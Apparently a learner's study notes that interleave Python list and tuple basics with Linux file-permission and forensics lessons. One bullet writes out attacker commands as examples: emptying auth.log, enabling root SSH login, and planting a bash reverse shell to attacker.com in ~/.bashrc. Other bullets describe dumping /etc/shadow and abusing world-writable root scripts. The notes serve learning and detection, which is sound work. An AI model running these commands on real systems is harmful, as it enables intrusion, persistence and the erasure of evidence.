- If you find a suspicious file and want to know where it came from, `mv` leaves traces. The inode number in `ls -li` can tell you if two files are actually the same data.
- Trying to run a script without execute bit would bring about permission denied
- **Ownership is the root privilege, not the permission bits.** If you don't want someone to access a file, the strongest protection is to not own it yourself — give it to root and set `chmod 600` with root as the owner.
- The owner of a file (and root) can always change permissions with `chmod`, even if the file is set to `000`. Permission bits control access to the file's contents, not who can change its permissions. Ownership is the real privilege. If an attacker compromises your account, they can change permissions on any file you own.
- `+` adds permissions, `-` removes them. `chmod +x` makes a file executable.

### What I learned
-  Using singular and plural names when naming for loops can help you identify whether a section of code is working with a single element from the list or the entire list.
- range(1, 5) prints only the numbers 1 through 4. This is another result of the off-by-one behavior you’ll see often in programming languages.
- There are various functions we can use for lists such as min(), max() and sum()
- To copy a list, you can make a slice that includes the entire original list by omitting the first index and the second index ([:]). We should not make the variable of the new list to be equal to the variable to the to-be-copied list
- Python refers to values that cannot change as immutable, and an immutable list is called a tuple. It uses parenthesis, () instead of square brackets.
- Tho we can't modify tuples however we can modify the variable which they are stored in without an error
```
dimensions = (200, 50)
print("Original dimensions:")
for dimension in dimensions:
	print(dimension)

dimensions = (400, 100)
print("\nModified dimensions:")
for dimension in dimensions:
	print(dimension)
```

- `>` overwrites a file's contents. `>>` appends to it. Confusing them can destroy data. Attackers use `>` to (1)overwrite logs (erasing evidence) `echo "" > /var/log/auth.log`, (2) overwrite config files (disabling security) `echo "PermitRootLogin yes" > /etc/ssh/sshd_config`, or (3) overwrite `.bashrc` (establishing persistence), `echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > ~/.bashrc`.
- Detecting log tampering: (1) Empty auth.log on a running system = suspicious. Check if auth.log.1 exists perhaps logrotate has happened if auth.log reached size limit. (2) If auth.log was emptied with `>`, its mtime updates to the current time. (3) If attacker timestomped it with `touch -t`, mtime looks old but ctime still updates to the current time. The mismatch between mtime and ctime is the detection.
- Attackers copy `/etc/shadow` to `/tmp` so they can crack password hashes as a normal user, after using temporary root access to read the file. This is called credential dumping — steal the hashes, get out, crack offline.
- Originally, `/etc/passwd` contained both account info and password hashes. Since `/etc/passwd` must be world-readable (for UID-to-username lookups), anyone could copy the hashes and crack them offline. The fix was splitting hashes into `/etc/shadow`, which is root-only readable. The password field in `/etc/passwd` is now a placeholder (`x`).
-  `cp` overwrites without warning. That's the default behavior. If you want a warning, you use `cp -i` (interactive). If you want to never overwrite, you use `cp -n` (no-clobber). But the default is silent overwrite.
- `cp` creates a new inode (new file, new data). `mv` keeps the same inode (same data, just a new name/location). Investigators can use `ls -li` to compare inode numbers and determine whether a file was copied or moved.
- inode - the filesystem's internal record of the file.
- `rm -rf` recursively and forcefully deletes everything in a path. A single space in the wrong place can turn a safe delete into a catastrophic one. There is no undo. Always triple-check the path. GitLab lost 300GB of production data in 2017 because of a misplaced `rm -rf`.
- `*` expands to files in the current directory, not from root. `rm -r` alone doesn't prompt — you need `rm -ri` for interactive prompts. The safe way to delete old files: `find /path -type f -mtime +30 -delete`.
- A world-writable script (777) that runs as root is a privilege escalation vector. An attacker can edit the script to add malicious commands. The next time root runs it, the attacker's code executes with root privileges. Never use 777 on scripts that run with elevated privileges.
